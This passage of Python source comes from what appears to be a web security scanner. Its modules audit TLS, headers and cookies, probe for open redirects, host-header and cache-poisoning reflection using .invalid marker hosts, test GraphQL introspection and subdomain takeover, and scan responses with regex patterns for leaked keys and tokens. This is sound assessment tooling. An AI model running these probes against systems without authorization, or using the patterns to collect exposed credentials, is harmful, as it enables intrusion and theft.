        p_note("HTTP->HTTPS", f"not measured - {shorten(redir_detail, 90)}", C.Y)
    else:
        p_ok("HTTP->HTTPS", redir_detail, C.G if redir else C.Y)
    ctx["headers"] = hdrs

def run_waf(ctx, args):
    p_section("WAF / CDN Fingerprinting", "4")
    ctx["modules_run"].append("waf")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("WAF", "not measured - no HTTP response")
        ctx["waf"] = []
        return
    waf = detect_waf(resp)
    ctx["waf"] = waf
    if waf:
        for w in waf:
            p_ok(w["name"], w["match"])
    else:
        p_note("WAF", "no known signature matched")

def run_tls(ctx, host, port, args):
    p_section("TLS / SSL Audit", "5")
    ctx["modules_run"].append("tls")
    ssl_i = ssl_details(host, port, timeout=args.timeout)
    ctx["ssl"] = ssl_i
    if not ssl_i.get("connected"):
        p_warn("TLS", ssl_i.get("error", "handshake failed"))
        return
    p_ok("Protocol", ssl_i.get("tls"))
    p_ok("Cipher", ssl_i.get("cipher"))
    p_ok("Issuer", shorten(ssl_i.get("issuer"), 70))
    p_ok("Subject", shorten(ssl_i.get("subject"), 70))
    p_ok("Valid from", ssl_i.get("not_before"))
    p_ok("Expires", f"{ssl_i.get('not_after')} ({ssl_i.get('days_left')} days)")
    if ssl_i.get("san"):
        p_ok("SANs", ", ".join(ssl_i["san"][:6]))
    if ssl_i.get("trusted") is True:
        p_ok("Chain trust", "verified against system store")
    elif ssl_i.get("trusted") is False:
        p_warn("Chain trust", shorten(ssl_i.get("verify_error"), 80))
    else:
        p_note("Chain trust", "could not verify")
    if ssl_i.get("self_signed"):
        p_warn("Certificate", "self-signed (issuer == subject)")
    if ssl_i.get("expired"):
        p_bad("Certificate", "EXPIRED")
    if ssl_i.get("covers_host") is False:
        p_bad("Hostname", "not covered by the certificate")

    versions = tls_handshake_versions(host, port, timeout=args.timeout)
    ctx["tls_versions"] = versions
    for name, res in versions.items():
        (p_ok if res.startswith("accepted") else p_note)(name, res)

    ciphers = tls_cipher_tests(host, port, timeout=args.timeout)
    ctx["tls_ciphers"] = ciphers
    for cph in ciphers:
        (p_ok if cph["ok"] else p_note)(cph["family"], f"{cph['cipher']} -> {cph['result']}")

    alpn, alpn_err = tls_alpn(host, port, timeout=args.timeout)
    ctx["alpn"] = alpn
    if alpn:
        p_ok("ALPN", alpn + (" (HTTP/2)" if alpn == "h2" else ""))
    else:
        p_note("ALPN", f"not measured - {alpn_err}")

    preload, preload_err = hsts_preload_status(host, timeout=max(12.0, args.timeout))
    ctx["hsts_preload"] = preload
    if preload:
        p_ok("HSTS preload", f"{preload.get('status')}")
    else:
        p_note("HSTS preload", f"not measured - {preload_err}")

def run_headers(ctx, url, args):
    p_section("HTTP Header Audit", "6")
    ctx["modules_run"].append("headers")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Headers", "not measured - no HTTP response")
        ctx["header_audit"] = {}
        return
    origin = f"https://reconx-{random.randint(1000, 9999)}.example"
    probe = http_request(url, timeout=args.timeout,
                         headers={"Origin": origin})
    audit = header_audit(resp, origin_probe=probe if probe.get("ok") else None)
    ctx["header_audit"] = {k: v for k, v in audit.items()}
    for h, val in audit["present"]:
        p_ok(h, shorten(val, 70))
    for h, val in audit["weak"]:
        p_warn(h, f"weak - {val}")
    for h, desc in audit["missing"]:
        p_note(h, f"missing ({desc})")
    if audit.get("acao"):
        p_ok("Access-Control-Allow-Origin", audit["acao"])
    for ck in audit["cookies"]:
        flags = []
        flags.append("Secure" if ck["secure"] else "no-Secure")
        flags.append("HttpOnly" if ck["httponly"] else "no-HttpOnly")
        flags.append(f"SameSite={ck['samesite']}" if ck["samesite"] else "no-SameSite")
        color = C.G if (ck["secure"] and ck["httponly"] and ck["samesite"]) else C.Y
        p_ok(f"Cookie {ck['name']}", ", ".join(flags), color)

def _cookie_category(ck, host):
    cats = []
    # persistence
    if ck.get("expires") or ck.get("max_age"):
        cats.append("persistent")
    else:
        cats.append("session")
    # security
    if ck.get("secure"):
        cats.append("secure")
    else:
        cats.append("insecure")
    if ck.get("httponly"):
        cats.append("httponly")
    else:
        cats.append("script-readable")
    ss = ck.get("samesite")
    if ss:
        cats.append(f"samesite={ss}")
    else:
        cats.append("no-samesite")
    # third-party?
    dom = (ck.get("domain") or "").lstrip(".").lower()
    if dom and host and dom not in host and not host.endswith(dom) and not dom.endswith(host):
        cats.append("third-party")
    if ck.get("partitioned"):
        cats.append("partitioned (CHIPS)")
    if ck.get("priority"):
        cats.append(f"priority={ck['priority']}")
    return cats

def run_cookies(ctx, url, args):
    p_section("Cookies (categorized)", "6b")
    ctx["modules_run"].append("cookies")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Cookies", "not measured - no HTTP response")
        ctx["cookies"] = []
        return
    cookies = parse_cookies(resp.get("set_cookie_list", []))
    ctx["cookies"] = cookies
    if not cookies:
        p_note("Cookies", "no Set-Cookie headers found")
        return
    host = ctx.get("host") or ""
    # summary
    session_n = sum(1 for c in cookies if not (c.get("expires") or c.get("max_age")))
    persistent_n = len(cookies) - session_n
    insecure_n = sum(1 for c in cookies if not c.get("secure"))
    no_httponly_n = sum(1 for c in cookies if not c.get("httponly"))
    no_samesite_n = sum(1 for c in cookies if not c.get("samesite"))
    third_party_n = sum(1 for c in cookies if "third-party" in _cookie_category(c, host))
    p_ok("Total cookies", len(cookies))
    p_ok("Session / Persistent", f"{session_n} / {persistent_n}")
    p_ok("Secure / Insecure", f"{len(cookies)-insecure_n} / {insecure_n}",
         C.G if insecure_n == 0 else C.Y)
    p_ok("HttpOnly / readable", f"{len(cookies)-no_httponly_n} / {no_httponly_n}",
         C.G if no_httponly_n == 0 else C.Y)
    p_ok("SameSite set / missing", f"{len(cookies)-no_samesite_n} / {no_samesite_n}",
         C.G if no_samesite_n == 0 else C.Y)
    if third_party_n:
        p_warn("Third-party cookies", third_party_n)
    p_line()
    for ck in cookies:
        cats = _cookie_category(ck, host)
        color = C.G if ("secure" in cats and "httponly" in cats and "no-samesite" not in cats) else C.Y
        p_ok(ck["name"], f"{ck['value'][:40]}  |  " + ", ".join(cats), color)
        if ck.get("domain"):
            p_note("  domain", ck["domain"], C.GR)
        if ck.get("path") and ck["path"] != "/":
            p_note("  path", ck["path"], C.GR)
        if ck.get("expires"):
            p_note("  expires", ck["expires"], C.GR)
        if ck.get("max_age"):
            p_note("  max-age", ck["max_age"], C.GR)

# ================= OPEN REDIRECT TESTER =================
REDIRECT_PARAMS = ["url", "next", "redirect", "redirect_url", "redirect_uri",
    "return", "return_url", "return_to", "goto", "dest", "destination",
    "target", "rurl", "redir", "continue", "callback", "success_url",
    "checkout_url", "image_url", "to", "out", "view", "path", "forward",
    "location", "link", "href", "next_url", "redirect_to", "returnTo"]

def test_open_redirects(base_url, timeout=8):
    attacker = "https://reconx-openredirect-test.invalid/"
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    results = []
    for param in REDIRECT_PARAMS:
        test_url = f"{root}/?{param}={quote(attacker, safe='')}"
        r = http_request(test_url, timeout=timeout, allow_redirects=False)
        loc = (r.get("headers") or {}).get("location", "") or ""
        vulnerable = False
        if loc:
            low = loc.lower()
            if "reconx-openredirect-test.invalid" in low:
                vulnerable = True
            if low.startswith("https://reconx-openredirect-test.invalid"):
                vulnerable = True
        results.append({"param": param, "status": r.get("status", 0),
                        "location": loc, "vulnerable": vulnerable})
    return results

# ================= HOST HEADER INJECTION =================
def test_host_header_injection(url, timeout=8):
    findings = []
    attacker = "evil-reconx-host.invalid"
    probes = [
        ("Host", attacker),
        ("X-Forwarded-Host", attacker),
        ("X-Forwarded-For", attacker),
        ("X-Original-URL", "/reconx-injected"),
        ("X-Rewrite-URL", "/reconx-injected"),
        ("X-Forwarded-Proto", "http"),
    ]
    for hdr, val in probes:
        r = http_request(url, timeout=timeout, headers={hdr: val}, allow_redirects=False)
        body = (r.get("body") or "").lower()
        loc = ((r.get("headers") or {}).get("location") or "").lower()
        reflected = (attacker in body or attacker in loc or
                     "reconx-injected" in body or "reconx-injected" in loc)
        findings.append({"header": hdr, "value": val, "status": r.get("status", 0),
                         "reflected": reflected})
    return findings

# ================= REFLECTED PARAMETER PROBE =================
def test_reflected_params(base_url, timeout=8):
    marker = "ReconXReflect7q9z"
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    params = ["q", "s", "search", "query", "keyword", "id", "page", "name",
              "user", "username", "email", "msg", "message", "comment", "text",
              "title", "lang", "language", "category", "sort", "order", "filter",
              "view", "action", "type", "mode", "debug", "callback", "cb"]
    results = []
    for param in params:
        test_url = f"{root}?{param}={marker}"
        r = http_request(test_url, timeout=timeout)
        body = r.get("body") or ""
        reflected = marker in body
        count = body.count(marker)
        results.append({"param": param, "status": r.get("status", 0),
                        "reflected": reflected, "occurrences": count})
    return results

# ================= MIXED CONTENT SCANNER =================
def scan_mixed_content(resp):
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    if not body:
        return []
    pattern = re.compile(r"""(?:src|href|action|data-src|poster)\s*=\s*["']?(http://[^"'\s>]+)""", re.I)
    found = []
    for m in pattern.finditer(body):
        url = m.group(1)
        if url.startswith("http://"):
            found.append(url)
    seen = set()
    out = []
    for u in found:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out

# ================= FORM & CSRF DISCOVERY =================
def discover_forms(resp):
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    if not body:
        return []
    forms = []
    form_re = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
    input_re = re.compile(r"<input\b([^>]*)>", re.I)
    for fm in form_re.finditer(body):
        attrs_str = fm.group(1)
        inner = fm.group(2)
        def attr(name, s=attrs_str):
            m = re.search(name + r'\s*=\s*["\']?([^"\'\s>]+)', s, re.I)
            return m.group(1) if m else None
        method = (attr("method") or "GET").upper()
        action = attr("action") or ""
        enctype = attr("enctype")
        inputs = []
        csrf_token = None
        has_password = False
        for im in input_re.finditer(inner):
            iattrs = im.group(1)
            def iattr(name, s=iattrs):
                m = re.search(name + r'\s*=\s*["\']?([^"\'\s>]+)', s, re.I)
                return m.group(1) if m else None
            itype = (iattr("type") or "text").lower()
            iname = iattr("name") or ""
            ivalue = iattr("value")
            inputs.append({"type": itype, "name": iname, "value": (ivalue or "")[:60]})
            if itype == "password":
                has_password = True
            low = iname.lower()
            if any(t in low for t in ("csrf", "token", "nonce", "authenticity", "_token", "xsrf")):
                csrf_token = iname
        forms.append({
            "method": method, "action": action, "enctype": enctype,
            "inputs": inputs, "has_password": has_password,
            "csrf_field": csrf_token, "input_count": len(inputs),
        })
    return forms

# ================= FAVICON HASH =================
def favicon_hash(base_url, timeout=8):
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    candidates = ["/favicon.ico", "/favicon.png", "/apple-touch-icon.png"]
    import hashlib, base64, urllib.request as _u, ssl as _s
    for path in candidates:
        try:
            req = _u.Request(root + path, headers={"User-Agent": "Mozilla/5.0"})
            ctx = None
            if root.startswith("https"):
                ctx = _s.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _s.CERT_NONE
            with _u.urlopen(req, timeout=timeout, context=ctx) as resp:
                data = resp.read()
            if not data:
                continue
            sha = hashlib.sha256(data).hexdigest()
            mmh = None
            try:
                import mmh3
                b64 = base64.encodebytes(data)
                mmh = mmh3.hash(b64)
            except Exception:
                mmh = None
            return {"path": path, "size": len(data), "sha256": sha, "mmh3": mmh}
        except Exception:
            continue
    return None

# ================= SOURCE MAP DETECTION =================
def detect_sourcemaps(resp, timeout=8):
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    parsed = urlparse(resp.get("url") or "")
    root = f"{parsed.scheme}://{parsed.netloc}"
    maps = set()
    for m in re.finditer(r"sourceMappingURL\s*=\s*([^\s*]+)", body):
        maps.add(m.group(1).strip())
    for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js)', body, re.I):
        js_url = m.group(1)
        if js_url.startswith("/"):
            js_url = root + js_url
        elif not js_url.startswith("http"):
            js_url = root + "/" + js_url
        map_url = js_url + ".map"
        r = http_request(map_url, timeout=timeout, method="HEAD")
        if r.get("status") == 200:
            maps.add(map_url)
    out = []
    seen = set()
    for m in maps:
        if m.startswith("/"):
            m = root + m
        elif not m.startswith("http"):
            m = root + "/" + m
        if m in seen:
            continue
        seen.add(m)
        r = http_request(m, timeout=timeout, method="HEAD")
        out.append({"map_url": m, "reachable": r.get("status") == 200,
                    "status": r.get("status", 0)})
    return out

# ================= EMAIL SECURITY =================
def email_security(host, timeout=8):
    out = {"spf": None, "dmarc": None, "mta_sts": None, "bimi": None,
           "mx": [], "notes": []}
    if not HAS_DNS:
        out["notes"].append("dnspython not installed - DNS TXT lookups unavailable")
        return out
    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 8
    def txt(qname):
        try:
            return [str(r).strip('"') for r in resolver.resolve(qname, "TXT")]
        except Exception:
            return []
    for t in txt(host):
        if t.lower().startswith("v=spf1"):
            out["spf"] = t
    for t in txt("_dmarc." + host):
        if t.lower().startswith("v=dmarc1"):
            out["dmarc"] = t
    for t in txt("_mta-sts." + host):
        if "v=stsv1" in t.lower() or t.lower().startswith("v=sts"):
            out["mta_sts"] = t
    for t in txt("default._bimi." + host):
        if "v=bimi1" in t.lower():
            out["bimi"] = t
    try:
        out["mx"] = [str(r) for r in resolver.resolve(host, "MX")]
    except Exception:
        out["mx"] = []
    return out

# ================= DIRECTORY LISTING DETECTION =================
DIR_LIST_PATHS = ["/", "/backup/", "/backups/", "/uploads/", "/files/", "/static/",
    "/assets/", "/images/", "/img/", "/docs/", "/tmp/", "/temp/", "/logs/",
    "/data/", "/download/", "/downloads/", "/archive/", "/archives/"]
DIR_LIST_SIGS = ["index of", "directory listing", "parent directory",
    "[to parent directory]", "last modified"]

def detect_directory_listing(base_url, timeout=6):
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    found = []
    for path in DIR_LIST_PATHS:
        r = http_request(root + path, timeout=timeout)
        if r.get("ok") and r.get("status") == 200:
            body = (r.get("body") or "").lower()
            if any(sig in body for sig in DIR_LIST_SIGS):
                found.append({"path": path, "status": r.get("status"),
                              "signature": next(s for s in DIR_LIST_SIGS if s in body)})
    return found

# ================= SUBDOMAIN TAKEOVER FINGERPRINTS =================
TAKEOVER_FINGERPRINTS = [
    ("github.io", "There isn't a GitHub Pages site here"),
    ("herokuapp.com", "No such app"),
    ("s3.amazonaws.com", "NoSuchBucket"),
    ("azurewebsites.net", "404 Web Site not found"),
    ("cloudfront.net", "Bad Request"),
    ("pantheon.io", "404 error unknown site"),
    ("zendesk.com", "Help Center Closed"),
    ("shopify.com", "Sorry, this shop is currently unavailable"),
    ("tumblr.com", "There's nothing here"),
    ("wordpress.com", "Do you want to register"),
    ("ghost.io", "The thing you were looking for is no longer here"),
    ("surge.sh", "project not found"),
    ("netlify.app", "Not Found - Request ID"),
    ("vercel.app", "404: NOT_FOUND"),
    ("bitbucket.io", "Repository not found"),
]

def check_subdomain_takeover(subdomains, timeout=8):
    results = []
    for sub in (subdomains or []):
        name = sub.get("name") if isinstance(sub, dict) else str(sub)
        if not name:
            continue
        ip = sub.get("ip") if isinstance(sub, dict) else None
        if not ip:
            continue
        try:
            r = http_request(f"http://{name}/", timeout=timeout, allow_redirects=True)
        except Exception:
            r = {"ok": False, "status": 0, "body": ""}
        body = (r.get("body") or "").lower()
        matched = None
        for service, sig in TAKEOVER_FINGERPRINTS:
            if sig.lower() in body:
                matched = service
                break
        if matched:
            results.append({"subdomain": name, "ip": ip,
                            "service": matched, "status": r.get("status", 0)})
    return results

# ================= RUNNERS =================

def run_open_redirects(ctx, url, args):
    p_section("Open Redirect Tester", "19")
    ctx["modules_run"].append("open_redirects")
    res = test_open_redirects(url, timeout=args.timeout)
    ctx["open_redirects"] = res
    vulns = [r for r in res if r["vulnerable"]]
    if vulns:
        for r in vulns:
            p_bad(r["param"], "OPEN REDIRECT -> " + r["location"])
    else:
        p_ok("Open redirects", "none of " + str(len(res)) + " params reflected an attacker URL")
    for r in res[:5]:
        if not r["vulnerable"]:
            p_note(r["param"], "HTTP " + str(r["status"]) + " (no redirect to attacker)")

def run_host_header(ctx, url, args):
    p_section("Host Header Injection", "20")
    ctx["modules_run"].append("host_header")
    res = test_host_header_injection(url, timeout=args.timeout)
    ctx["host_header"] = res
    reflected = [r for r in res if r["reflected"]]
    if reflected:
        for r in reflected:
            p_bad(r["header"], "REFLECTED in response (HTTP " + str(r["status"]) + ")")
    else:
        p_ok("Host header", "no reflection across " + str(len(res)) + " probes")

def run_reflected_params(ctx, url, args):
    p_section("Reflected Parameter Probe", "21")
    ctx["modules_run"].append("reflected_params")
    res = test_reflected_params(url, timeout=args.timeout)
    ctx["reflected_params"] = res
    refl = [r for r in res if r["reflected"]]
    if refl:
        for r in refl:
            p_warn(r["param"], "reflected " + str(r["occurrences"]) + "x (HTTP " + str(r["status"]) + ")")
    else:
        p_ok("Reflection", "none of " + str(len(res)) + " params reflected")

def run_mixed_content(ctx, url, args):
    p_section("Mixed Content Scanner", "22")
    ctx["modules_run"].append("mixed_content")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Mixed content", "not measured - no HTTP response")
        ctx["mixed_content"] = []
        return
    if not (ctx.get("url") or "").lower().startswith("https://"):
        p_note("Mixed content", "target is not HTTPS - skipped")
        ctx["mixed_content"] = []
        return
    found = scan_mixed_content(resp)
    ctx["mixed_content"] = found
    if found:
        for u in found[:20]:
            p_bad("mixed", u)
        if len(found) > 20:
            p_note("More", str(len(found)-20) + " additional resources in JSON report")
    else:
        p_ok("Mixed content", "no http:// sub-resources on HTTPS page")

def run_forms(ctx, url, args):
    p_section("Form & CSRF Discovery", "23")
    ctx["modules_run"].append("forms")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Forms", "not measured - no HTTP response")
        ctx["forms"] = []
        return
    forms = discover_forms(resp)
    ctx["forms"] = forms
    if not forms:
        p_note("Forms", "no <form> elements found")
        return
    p_ok("Forms found", len(forms))
    for i, f in enumerate(forms, 1):
        flags = [f["method"]]
        if f["has_password"]:
            flags.append("PASSWORD FIELD")
        if f["csrf_field"]:
            flags.append("CSRF: " + f["csrf_field"])
        else:
            flags.append("NO CSRF TOKEN")
        color = C.G if (f["csrf_field"] or not f["has_password"]) else C.Y
        p_ok("form #" + str(i), "action=" + (f["action"] or "(self)") + "  inputs=" + str(f["input_count"]) + "  " + " | ".join(flags), color)

def run_favicon(ctx, url, args):
    p_section("Favicon Hash", "24")
    ctx["modules_run"].append("favicon")
    fh = favicon_hash(url, timeout=args.timeout)
    ctx["favicon"] = fh
    if not fh:
        p_note("Favicon", "not found")
        return
    p_ok("Path", fh["path"])
    p_ok("Size", str(fh["size"]) + " bytes")
    p_ok("SHA256", fh["sha256"])
    if fh.get("mmh3") is not None:
        p_ok("mmh3 (Shodan)", fh["mmh3"])

def run_sourcemaps(ctx, url, args):
    p_section("Source Map Detection", "25")
    ctx["modules_run"].append("sourcemaps")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Source maps", "not measured - no HTTP response")
        ctx["sourcemaps"] = []
        return
    sm = detect_sourcemaps(resp, timeout=args.timeout)
    ctx["sourcemaps"] = sm
    if not sm:
        p_ok("Source maps", "none detected")
        return
    for s in sm:
        color = C.Y if s["reachable"] else C.G
        p_ok(s["map_url"], "HTTP " + str(s["status"]) + " (" + ("EXPOSED" if s["reachable"] else "not reachable") + ")", color)

def run_email_security(ctx, host, args):
    p_section("Email Security (SPF/DMARC/MTA-STS/BIMI)", "26")
    ctx["modules_run"].append("email_security")
    if is_ip(host):
        p_note("Email security", "not measured - target is an IP")
        ctx["email_security"] = None
        return
    es = email_security(host, timeout=args.timeout)
    ctx["email_security"] = es
    if es.get("spf"):
        p_ok("SPF", shorten(es["spf"], 90))
    else:
        p_warn("SPF", "no SPF record found")
    if es.get("dmarc"):
        p_ok("DMARC", shorten(es["dmarc"], 90))
    else:
        p_warn("DMARC", "no DMARC record found")
    if es.get("mta_sts"):
        p_ok("MTA-STS", shorten(es["mta_sts"], 90))
    else:
        p_note("MTA-STS", "not configured")
    if es.get("bimi"):
        p_ok("BIMI", shorten(es["bimi"], 90))
    else:
        p_note("BIMI", "not configured")
    if es.get("mx"):
        for mx in es["mx"][:6]:
            p_ok("MX", mx)
    if es.get("notes"):
        for n in es["notes"]:
            p_note("Note", n)

def run_dir_listing(ctx, url, args):
    p_section("Directory Listing Detection", "27")
    ctx["modules_run"].append("dir_listing")
    found = detect_directory_listing(url, timeout=args.timeout)
    ctx["dir_listing"] = found
    if found:
        for f in found:
            p_bad(f["path"], "directory listing (" + f["signature"] + ")")
    else:
        p_ok("Directory listing", "none detected across " + str(len(DIR_LIST_PATHS)) + " paths")

def run_takeover(ctx, args):
    p_section("Subdomain Takeover Check", "28")
    ctx["modules_run"].append("takeover")
    subs = ctx.get("subdomains") or []
    if not subs:
        p_note("Takeover", "not measured - no subdomains enumerated")
        ctx["takeover"] = []
        return
    res = check_subdomain_takeover(subs, timeout=args.timeout)
    ctx["takeover"] = res
    if res:
        for r in res:
            p_bad(r["subdomain"], "possible takeover -> " + r["service"] + " (HTTP " + str(r["status"]) + ")")
    else:
        p_ok("Takeover", "no takeover fingerprints across " + str(len(subs)) + " subdomains")
# ================= SECRET / JWT SCANNER =================
SECRET_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("AWS Secret Key", re.compile(r"(?i)aws(.{0,20})?['\"][0-9a-zA-Z/+]{40}['\"]")),
    ("Google API Key", re.compile(r"AIza[0-9A-Za-z\-_]{35}")),
    ("Slack Token", re.compile(r"xox[baprs]-[0-9a-zA-Z]{10,48}")),
    ("Slack Webhook", re.compile(r"https://hooks\.slack\.com/services/T[0-9A-Z]+/B[0-9A-Z]+/[0-9A-Za-z]+")),
    ("GitHub Token", re.compile(r"gh[pousr]_[0-9A-Za-z]{36,}")),
    ("JWT", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    ("Private Key", re.compile(r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----")),
    ("Generic API Key", re.compile(r"(?i)(api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*['\"]?[0-9a-zA-Z\-_]{16,}['\"]?")),
    ("Generic Token", re.compile(r"(?i)(access[_-]?token|auth[_-]?token|bearer)\s*[:=]\s*['\"]?[0-9a-zA-Z\-_.]{20,}['\"]?")),
    ("Basic Auth", re.compile(r"Basic [A-Za-z0-9+/]{10,}={0,2}")),
    ("Database URL", re.compile(r"(?i)(mysql|postgres|mongodb|redis)://[^\s\"'<>]+")),

]

def scan_secrets(resp):
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    headers = resp.get("headers") or {}
    haystack = body + "\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())
    found = []
    seen = set()
    for name, pat in SECRET_PATTERNS:
        for m in pat.finditer(haystack):
            val = m.group(0)
            key = (name, val[:40])
            if key in seen:
                continue
            seen.add(key)
            # find context (line)
            idx = haystack.rfind("\n", 0, m.start())
            line = haystack[idx+1:haystack.find("\n", m.start())][:120]
            found.append({"type": name, "value": val[:80], "context": line.strip()})
    return found

# ================= GRAPHQL INTROSPECTION =================
GRAPHQL_PATHS = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/gql",
    "/query", "/api/gql", "/graphql/console"]

def test_graphql(resp_url, timeout=8):
    parsed = urlparse(resp_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    results = []
    introspection_query = '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind}}}"}'
    for path in GRAPHQL_PATHS:
        url = root + path
        r = http_request(url, method="POST", timeout=timeout,
                         headers={"Content-Type": "application/json"},
                         data=introspection_query)
        body = r.get("body") or ""
        introspection = ("__schema" in body or "queryType" in body or
                         "mutationType" in body)
        # also try GET
        if not introspection and r.get("status") in (405, 400, 0):
            r2 = http_request(url + "?query={__schema{types{name}}}", timeout=timeout)
            body2 = r2.get("body") or ""
            introspection = ("__schema" in body2 or "queryType" in body2)
            if introspection:
                r = r2
                body = body2
        results.append({"path": path, "url": url, "status": r.get("status", 0),
                        "introspection_enabled": introspection,
                        "reachable": r.get("status", 0) not in (0, 404, 405, 501)})
    return results

# ================= WEBSOCKET DETECTION =================
def detect_websocket(url, timeout=8):
    parsed = urlparse(url)
    # try common websocket paths
    paths = ["/", "/ws", "/websocket", "/socket", "/socket.io/", "/sockjs/"]
    results = []
    for path in paths:
        try:
            # send an HTTP upgrade request manually
            host = parsed.netloc
            req_bytes = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"Origin: {parsed.scheme}://{host}\r\n"
                f"\r\n"
            ).encode()
            ip = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            # resolve if needed
            if not _is_ip_str(ip):
                try:
                    ip = socket.gethostbyname(ip)
                except Exception:
                    ip = parsed.hostname
            # use TLS if https
            if parsed.scheme == "https":
                import ssl as _s
                ctx = _s.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _s.CERT_NONE
                with socket.create_connection((ip, port), timeout=timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=parsed.hostname) as ss:
                        ss.sendall(req_bytes)
                        data = ss.recv(1024)
            else:
                with socket.create_connection((ip, port), timeout=timeout) as sock:
                    sock.sendall(req_bytes)
                    data = sock.recv(1024)
            text = data.decode("utf-8", errors="ignore")
            first_line = text.split("\r\n")[0] if text else ""
            upgraded = "101" in first_line and "upgrade" in text.lower()
            results.append({"path": path, "status_line": first_line.strip(),
                            "upgraded": upgraded})
        except Exception as e:
            results.append({"path": path, "status_line": "", "upgraded": False,
                            "error": str(e)[:80]})
    return results

def _is_ip_str(s):
    try:
        ipaddress.ip_address(s)
        return True
    except Exception:
        return False

# ================= CACHE POISONING PROBE =================
def test_cache_poisoning(url, timeout=8):
    """Live probe: send unkeyed headers and check if they're reflected in the response."""
    findings = []
    unkeyed = ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Original-URL",
                "X-Rewrite-URL", "X-Forwarded-Proto", "X-Host", "X-Forwarded-Server"]
    marker = "reconx-cp-test.invalid"
    for hdr in unkeyed:
        r = http_request(url, timeout=timeout, headers={hdr: marker}, allow_redirects=False)
        body = (r.get("body") or "").lower()
        loc = ((r.get("headers") or {}).get("location") or "").lower()
        reflected = marker in body or marker in loc
        findings.append({"header": hdr, "reflected": reflected,
                         "status": r.get("status", 0)})
    return findings

# ================= HPP (HTTP PARAMETER POLLUTION) =================
def test_hpp(url, timeout=8):
    """Live probe: send duplicate query parameters and check server behavior."""
    parsed = urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    test_url = f"{root}?id=1&id=2&id=3"
    r = http_request(test_url, timeout=timeout)
    body = r.get("body") or ""
    # check which value(s) appear
    vals_found = [v for v in ("1", "2", "3") if v in body]
    return {"url": test_url, "status": r.get("status", 0),
            "values_reflected": vals_found,
            "pollution_accepted": len(vals_found) > 1}

# ================= DNSSEC CHECK =================
def check_dnssec(host, timeout=8):
    """Live check: does the domain have DNSSEC (DS/DNSKEY records)?"""
    out = {"ds": False, "dnskey": False, "rrsig": False, "secure": False,
           "details": []}
    if not HAS_DNS:
        out["details"].append("dnspython not installed")
        return out
    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 8
    for rtype in ("DS", "DNSKEY", "RRSIG"):
        try:
            ans = resolver.resolve(host, rtype)
            vals = [str(r) for r in ans]
            if vals:
                out[rtype.lower()] = True
                out["details"].append(f"{rtype}: {len(vals)} record(s)")
        except Exception as e:
            out["details"].append(f"{rtype}: not found ({e})")
    out["secure"] = out["ds"] or out["dnskey"]
    return out

# ================= RUNNERS =================

def run_secrets(ctx, url, args):
    p_section("Secret / JWT Scanner", "29")
    ctx["modules_run"].append("secrets")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Secrets", "not measured - no HTTP response")
        ctx["secrets"] = []
        return
    found = scan_secrets(resp)
    ctx["secrets"] = found
    if found:
        for f in found[:20]:
            p_bad(f["type"], shorten(f["value"], 60))
            p_note("  context", shorten(f["context"], 90), C.GR)
        if len(found) > 20:
            p_note("More", str(len(found) - 20) + " additional findings in JSON report")
    else:
        p_ok("Secrets", "no secrets/JWTs/keys detected in response")

def run_graphql(ctx, url, args):
    p_section("GraphQL Introspection", "30")
    ctx["modules_run"].append("graphql")
    res = test_graphql(url, timeout=args.timeout)
    ctx["graphql"] = res
    enabled = [r for r in res if r["introspection_enabled"]]
    reachable = [r for r in res if r["reachable"]]
    if enabled:
        for r in enabled:
            p_bad(r["path"], "INTROSPECTION ENABLED (HTTP " + str(r["status"]) + ")")
    elif reachable:
        for r in reachable:
            p_note(r["path"], "reachable but introspection disabled (HTTP " + str(r["status"]) + ")")
    else:
        p_ok("GraphQL", "no GraphQL endpoint found")

def run_websocket(ctx, url, args):
    p_section("WebSocket Detection", "31")
    ctx["modules_run"].append("websocket")
    res = detect_websocket(url, timeout=args.timeout)
    ctx["websocket"] = res
    upgraded = [r for r in res if r["upgraded"]]
